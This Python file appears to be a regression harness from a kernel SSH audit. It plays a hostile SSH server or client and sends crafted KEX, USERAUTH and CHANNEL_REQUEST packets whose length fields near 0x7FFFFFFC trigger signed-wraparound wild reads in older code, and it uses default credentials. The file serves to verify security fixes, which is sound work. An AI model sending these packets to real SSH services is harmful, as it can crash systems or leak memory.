#!/usr/bin/env python3
# SPDX-License-Identifier: Apache-2.0
# Copyright 2026 cubestudio-dev <cubestudio@qq.com>
"""P0fix3 hostile SSH harness -- reproduction of the SIGNED-WRAPAROUND
residuals left by the P0fix1/P0fix2 length checks (verification round,
WP-AUDIT-01-VERIFY section 4.3).

The P0fix1/P0fix2 fixes rejected NEGATIVE lengths but kept the additive
bound form `off + len > plen`; for len in [0x7FFFFFF8..0x7FFFFFFF] the
addition wraps negative and the check passes, re-opening the wild
pointer read. These cases drive exactly those windows.

Server cases (kernel `ssh` CLIENT connects to this hostile server):
  a04_kslen_wrap   BUG-0010 residual (A14-04): curve25519
                   KEX_ECDH_REPLY ks_len = 0x7FFFFFFC
  a05_flen_wrap    BUG-0010 residual: curve25519 KEX_ECDH_REPLY
                   f_len = 0x7FFFFFFC (memcpy from payload + ~2GB)
  a05g_flen_wrap   BUG-0011 residual (A14-05): group14 KEXDH_REPLY
                   f_len = 0x7FFFFFFC (right-align path wild read)

Client cases (this hostile client connects to the kernel sshd):
  a09_elen_wrap    BUG-0015 residual (A14-09): group14 KEXDH_INIT
                   e_len = 0x7FFFFFFC (4+el wraps, ed = payload + ~2GB)
  a13_ulen_wrap    BUG-0019 residual (A14-13): USERAUTH user length
                   0x7FFFFFFC (paramiko transport, post-NEWKEYS)
  a13_slen_wrap    BUG-0019 residual: USERAUTH service length 0x7FFFFFFC
  a13_pwlen_wrap   BUG-0019 residual: USERAUTH password length 0x7FFFFFFC
  a38_reqlen_wrap  BUG-0224 residual (A14-38): post-auth CHANNEL_REQUEST
                   reqlen = 0x7FFFFFF8

A FIXED kernel closes the connection cleanly and keeps running; the
runner (tools/p0fix3_run_case.py) verifies both with a trailing `ps`.
"""
import argparse
import socket
import struct
import sys
import time


def recv_exact(conn, n, timeout=180):
    conn.settimeout(timeout)
    buf = b""
    while len(buf) < n:
        d = conn.recv(n - len(buf))
        if not d:
            break
        buf += d
    return buf


def recv_banner(conn):
    buf = b""
    while b"\r\n" not in buf and len(buf) < 512:
        d = conn.recv(1)
        if not d:
            break
        buf += d
    return buf


def namelist(items):
    return b"".join(struct.pack(">I", len(s)) + s for s in items)


def send_packet(conn, payload):
    pad = 8 - ((4 + 1 + len(payload)) % 8)
    if pad < 4:
        pad += 8
    pkt_len = 1 + len(payload) + pad
    conn.sendall(struct.pack(">I", pkt_len) + bytes([pad]) + payload + b"\x00" * pad)


def read_packet(conn, timeout=180):
    hdr = recv_exact(conn, 4, timeout)
    if len(hdr) < 4:
        return None
    (pkt_len,) = struct.unpack(">I", hdr)
    if pkt_len > 40000:
        return None
    body = recv_exact(conn, pkt_len, timeout)
    if len(body) < pkt_len:
        return None
    pad = body[0]
    return body[1:pkt_len - pad]


def kexinit_packet_raw(kex_names):
    payload = b"\x14" + b"\x11" * 16 + namelist(kex_names) + \
        namelist([b"ssh-rsa"]) + namelist([b"aes128-ctr"]) * 2 + \
        namelist([b"hmac-sha2-256"]) * 2 + namelist([b"none"]) * 2 + \
        namelist([b""]) * 2 + b"\x00" + struct.pack(">I", 0)
    pad = 8 - ((4 + 1 + len(payload)) % 8)
    if pad < 4:
        pad += 8
    pkt_len = 1 + len(payload) + pad
    return struct.pack(">I", pkt_len) + bytes([pad]) + payload + b"\x00" * pad


# ---------------------------------------------------------------- server

def _kex_reply(ks_len=None, f_len=None):
    """KEXDH_REPLY/KEX_ECDH_REPLY payload with hostile length fields."""
    host_key = b"\x00" * 4 + b"ssh-rsa" + b"\x01\x00\x01" + b"\x11" * 256
    if ks_len is None:
        ks_field = struct.pack(">I", len(host_key)) + host_key
    else:
        ks_field = struct.pack(">I", ks_len)          # lies about the body
    f_body = b"\x00" + b"\xf0" * 32
    if f_len is None:
        f_field = struct.pack(">I", len(f_body)) + f_body
    else:
        f_field = struct.pack(">I", f_len) + f_body
    sig = struct.pack(">I", 8) + b"SIGDATA\x00"
    return b"\x1f" + ks_field + f_field + sig


def srv_a04_kslen_wrap(conn):
    """curve25519 path: KEX_ECDH_REPLY ks_len = 0x7FFFFFFC.

    Old client code: `off(4) + ks_len` wraps to 0x80000000 (negative),
    `> payload_len` is false, check passes; ks_len > 1024 skips the
    memcpy but `off += ks_len` goes negative and the next u32 read is a
    ~2GB wild pointer."""
    conn.sendall(b"SSH-2.0-EVIL_a04w\r\n")
    recv_banner(conn)
    read_packet(conn)                                       # client KEXINIT
    conn.sendall(kexinit_packet_raw([b"curve25519-sha256"]))
    read_packet(conn)                                       # client ECDH_INIT (30)
    send_packet(conn, _kex_reply(ks_len=0x7FFFFFFC))
    time.sleep(5)


def srv_a05_flen_wrap(conn):
    """curve25519 path: f_len = 0x7FFFFFFC.

    Old client code: the f_len check `off + f_len > payload_len` wraps
    and passes, `f_len < 32` is false, then
    `memcpy(server_pub + 224, payload + off + (f_len - 32), 32)` reads
    from payload + ~2GB."""
    conn.sendall(b"SSH-2.0-EVIL_a05w\r\n")
    recv_banner(conn)
    read_packet(conn)
    conn.sendall(kexinit_packet_raw([b"curve25519-sha256"]))
    read_packet(conn)
    send_packet(conn, _kex_reply(f_len=0x7FFFFFFC))
    time.sleep(5)


def srv_a05g_flen_wrap(conn):
    """group14 path: f_len = 0x7FFFFFFC.

    Old client code: check wraps/passes, then the right-align path does
    `data_off += (copy_len - 256)` -> payload + ~2GB, memcpy 256 bytes."""
    conn.sendall(b"SSH-2.0-EVIL_a05gw\r\n")
    recv_banner(conn)
    read_packet(conn)
    conn.sendall(kexinit_packet_raw([b"diffie-hellman-group14-sha256"]))
    conn.settimeout(300)     # client 2048-bit modexp under TCG is slow
    read_packet(conn)                                       # client KEXDH_INIT
    send_packet(conn, _kex_reply(f_len=0x7FFFFFFC))
    time.sleep(5)


SERVER_CASES = {
    "a04_kslen_wrap": srv_a04_kslen_wrap,
    "a05_flen_wrap": srv_a05_flen_wrap,
    "a05g_flen_wrap": srv_a05g_flen_wrap,
}


def run_server(case, port):
    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind(("127.0.0.1", port))
    srv.listen(1)
    print(f"[evil-server] case={case} listening on 127.0.0.1:{port}", flush=True)
    srv.settimeout(300)
    try:
        conn, addr = srv.accept()
    except socket.timeout:
        print("[evil-server] no connection within 300s", flush=True)
        return 2
    print(f"[evil-server] connection from {addr}", flush=True)
    try:
        SERVER_CASES[case](conn)
        print(f"[evil-server] case {case} payload sent", flush=True)
    except Exception as e:  # noqa
        print(f"[evil-server] case {case} exception: {e!r}", flush=True)
        return 1
    finally:
        try:
            conn.close()
        except Exception:  # noqa
            pass
        srv.close()
    return 0


# ---------------------------------------------------------------- client

def cli_a09_elen_wrap(conn):
    """group14 KEXDH_INIT with e_len = 0x7FFFFFFC (pre-auth, plaintext).

    Old sshd code: `4 + el > plen` wraps negative -> passes; then
    `el > SSHD_DH_BYTES` -> `ed += el - 256` -> payload + ~2GB, and the
    memcpy of 256 bytes is a wild pre-auth read (#PF)."""
    conn.sendall(b"SSH-2.0-EVILCLIENT\r\n")
    recv_banner(conn)
    conn.sendall(kexinit_packet_raw([b"diffie-hellman-group14-sha256"]))
    read_packet(conn)                            # server KEXINIT (ignored)
    payload = b"\x1e" + struct.pack(">I", 0x7FFFFFFC) + b"\x07" * 32
    send_packet(conn, payload)                   # KEXDH_INIT, hostile e_len
    time.sleep(5)


PLAIN_CLIENT_CASES = {
    "a09_elen_wrap": cli_a09_elen_wrap,
}


def _paramiko_transport(port, timeout=120):
    import paramiko
    t = paramiko.Transport(("127.0.0.1", port))
    t.start_client(timeout=timeout)
    return t


def _pk_case(port, builder, label):
    """Common paramiko flow: kex + NEWKEYS, then send the crafted
    message through the encrypted transport."""
    t = _paramiko_transport(port)
    try:
        from paramiko.message import Message
        t.packetizer.send_message(Message(builder()))
        print(f"[evil-client] {label}: hostile message sent", flush=True)
    finally:
        time.sleep(4)
        try:
            t.close()
        except Exception:  # noqa
            pass
    return 0


def cli_a13_ulen_wrap(port):
    """USERAUTH_REQUEST user length = 0x7FFFFFFC.

    Old sshd: `ulen < 0` false, `off + ulen > plen` wraps -> passes;
    `ulen < 31` false so memcpy copies 31 bytes (bounded) BUT
    `off += ulen` goes negative and every later read is wild."""
    def b():
        return b"\x32" + struct.pack(">I", 0x7FFFFFFC) + b"oc" + \
            b"\x00\x00\x00\x0e" + b"ssh-connection" + \
            b"\x00\x00\x00\x08" + b"password" + b"\x00" + \
            struct.pack(">I", 2) + b"oc"
    return _pk_case(port, b, "a13_ulen_wrap")


def cli_a13_slen_wrap(port):
    """USERAUTH_REQUEST service length = 0x7FFFFFFC.

    Old sshd: slen was COMPLETELY unvalidated; `off += slen` went
    negative and the method-length read hit payload + ~2GB (pre-
    credential #PF, same threat model as the original A14-13)."""
    def b():
        return b"\x32" + struct.pack(">I", 2) + b"oc" + \
            struct.pack(">I", 0x7FFFFFFC) + b"ssh-connection" + \
            b"\x00\x00\x00\x08" + b"password" + b"\x00" + \
            struct.pack(">I", 2) + b"oc"
    return _pk_case(port, b, "a13_slen_wrap")


def cli_a13_pwlen_wrap(port):
    """USERAUTH_REQUEST password length = 0x7FFFFFFC (boolean FALSE form)."""
    def b():
        return b"\x32" + struct.pack(">I", 2) + b"oc" + \
            b"\x00\x00\x00\x0e" + b"ssh-connection" + \
            b"\x00\x00\x00\x08" + b"password" + b"\x00" + \
            struct.pack(">I", 0x7FFFFFFC) + b"oc"
    return _pk_case(port, b, "a13_pwlen_wrap")


def cli_a38_reqlen_wrap(port):
    """Full password auth, then CHANNEL_REQUEST reqlen = 0x7FFFFFF8.

    Old sshd: `off(8) + reqlen` wraps -> passes; `off += reqlen`
    negative; `off >= plen` false for negative off; `payload[off]` is a
    ~2GB wild read. Post-authentication (default credentials)."""
    t = _paramiko_transport(port)
    try:
        t.auth_password("oc", "oc")
        print("[evil-client] a38: auth ok, sending hostile CHANNEL_REQUEST", flush=True)
        from paramiko.message import Message
        raw = b"\x5a" + struct.pack(">I", 0) + \
            struct.pack(">I", 0x7FFFFFF8) + b"exec\x01"
        t.packetizer.send_message(Message(raw))
        print("[evil-client] a38_reqlen_wrap: hostile message sent", flush=True)
    except Exception as e:  # noqa
        print(f"[evil-client] a38: {e!r}", flush=True)
        return 1
    finally:
        time.sleep(4)
        try:
            t.close()
        except Exception:  # noqa
            pass
    return 0


PK_CLIENT_CASES = {
    "a13_ulen_wrap": cli_a13_ulen_wrap,
    "a13_slen_wrap": cli_a13_slen_wrap,
    "a13_pwlen_wrap": cli_a13_pwlen_wrap,
    "a38_reqlen_wrap": cli_a38_reqlen_wrap,
}


def run_client(case, port):
    if case in PK_CLIENT_CASES:
        return PK_CLIENT_CASES[case](port) or 0
    conn = socket.create_connection(("127.0.0.1", port), timeout=120)
    print(f"[evil-client] connected (case {case})", flush=True)
    try:
        PLAIN_CLIENT_CASES[case](conn)
        print(f"[evil-client] case {case} payload sent", flush=True)
    except Exception as e:  # noqa
        print(f"[evil-client] case {case} exception: {e!r}", flush=True)
        return 1
    finally:
        try:
            conn.close()
        except Exception:  # noqa
            pass
    return 0


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--role", required=True, choices=["server", "client"])
    ap.add_argument("--case", required=True)
    ap.add_argument("--port", type=int, required=True)
    args = ap.parse_args()
    if args.role == "server":
        if args.case not in SERVER_CASES:
            print(f"[evil-server] unknown case {args.case}", flush=True)
            return 2
        return run_server(args.case, args.port)
    if args.case in PLAIN_CLIENT_CASES or args.case in PK_CLIENT_CASES:
        return run_client(args.case, args.port)
    print(f"[evil-client] unknown case {args.case}", flush=True)
    return 2


if __name__ == "__main__":
    sys.exit(main())
